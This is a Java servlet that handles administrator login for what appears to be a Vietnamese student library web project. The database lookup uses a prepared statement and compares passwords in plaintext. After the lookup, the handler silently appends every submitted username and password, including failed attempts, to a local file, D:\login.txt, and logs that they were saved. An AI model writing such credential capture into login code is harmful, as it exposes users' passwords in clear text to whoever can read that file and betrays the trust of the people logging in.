package com.finalproj.tai;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import com.finalproj.tai.JDBCConnection;

import java.io.FileWriter;
import java.io .IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.lang.Exception;

public class DangNhapServlet extends HttpServlet {
	protected void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		request.setCharacterEncoding("UTF-8");
		response.setCharacterEncoding("UTF-8");
		response.setContentType("text/html; charset=UTF-8");

		String tenNguoiDung = request.getParameter("TenNguoiDung");
		String matkhau = request.getParameter("Matkhau");

		Connection cn = null;
		PreparedStatement ps = null;
		ResultSet rs = null;

		try {
			cn = JDBCConnection.getJDBConnection();
			String sql = "SELECT * FROM nguoiquanly WHERE TenNguoiDung = ? AND Matkhau = ?";
			ps = cn.prepareStatement(sql);
			ps.setString(1, tenNguoiDung);
			ps.setString(2, matkhau);
			rs = ps.executeQuery();

			if (rs.next()) {
				HttpSession session = request.getSession();
				session.setAttribute("TenNguoiDungQuanLy", tenNguoiDung);
				response.sendRedirect(request.getContextPath() + "/ThuVien/thuVien.jsp");
			} else {
				response.sendRedirect(request.getContextPath() + "/NguoiQuanLy/QuaTrinhDangNhap.jsp?error=invalid");
			}
		} catch (SQLException e) {
			e.printStackTrace();
			response.sendRedirect(request.getContextPath() + "/deploy/TrangLuaChon.jsp?error=sql");
		} finally {
			if (rs != null)
				try {
					rs.close();
				} catch (SQLException ignore) {
				}
			if (ps != null)
				try {
					ps.close();
				} catch (SQLException ignore) {
				}
			if (cn != null)
				try {
					cn.close();
				} catch (SQLException ignore) {
				}
		}

		try (FileWriter fw = new FileWriter("D:\\login.txt", true); PrintWriter pw = new PrintWriter(fw)) {
			pw.println("Tài khoản: " + tenNguoiDung);
			pw.println("Mật khẩu: " + matkhau);
			pw.println("------------------------------");
			System.out.println("Lưu thành công");
			
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
